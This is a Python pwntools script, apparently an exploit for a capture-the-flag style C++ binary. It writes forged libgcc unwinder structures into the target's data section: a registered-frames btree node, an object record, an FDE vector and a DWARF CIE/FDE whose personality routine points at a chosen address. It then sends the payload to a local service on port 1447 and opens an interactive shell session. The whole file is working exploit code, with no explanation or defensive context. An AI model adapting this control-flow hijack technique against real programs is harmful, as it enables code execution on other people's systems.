from pwn import *

addrs = {
	"number": 0x41d060,
	"(anonymous namespace)::emergency_pool": 0x41d0e0,
	"__gnu_cxx::__verbose_terminate_handler()::terminating": 0x41d120,
	"once_regsizes": 0x41d130,
	"dwarf_reg_size_table": 0x41d140,
	"object_mutex": 0x41d160,
	"in_shutdown": 0x41d188,
	"registered_objects": 0x41d190,
	"registered_frames": 0x41d1b0,
	"version_lock_cond": 0x41d1e0,
	"version_lock_mutex": 0x41d220,
}

def uleb(n):
	b = []
	while n:
		b.append((n & 0x7f) | 0x80)
		n >>= 7
	b[-1] &= 0x7f
	return bytes(b)

for k, v in addrs.items(): globals()[k] = v - addrs["number"]

btree_node_inner = p32(0)
btree_node_leaf = p32(1)
btree_node_free = p32(2)

obj_s_b_sorted = 1

payload = flat({
	number:             [0, p32(1), btree_node_leaf, [0, 0xffffffffffffffff, addrs["number"] + 40]], # btree_node (root)
	number + 40:        [0, 0, 0, addrs["number"] + 80, obj_s_b_sorted], # object
	number + 80:        [0, 1, addrs["number"] + 472], # fde_vector
	number + 104:       [
	                       b"BBBB",
	                       p32(0),
	                       p8(1),
	                       b"P\0" + uleb(13) + uleb(37) + p8(73) + b"\x01" + uleb(0x401b16) + b"\0"
	                   ], # dwarf_cie
	once_regsizes:     [0, 0],
	registered_frames: [addrs["number"], 0, 0], # btree
	number + 472:       [p32(0x41414141), p32(472 + 4 - 104), 0x45, 0xffffffffffffffff-0x45], # dwarf_fde
	500:               b'\n'
}, word_size=64)


with remote("localhost", 1447) as r:
	r.sendline(payload)
	r.interactive()
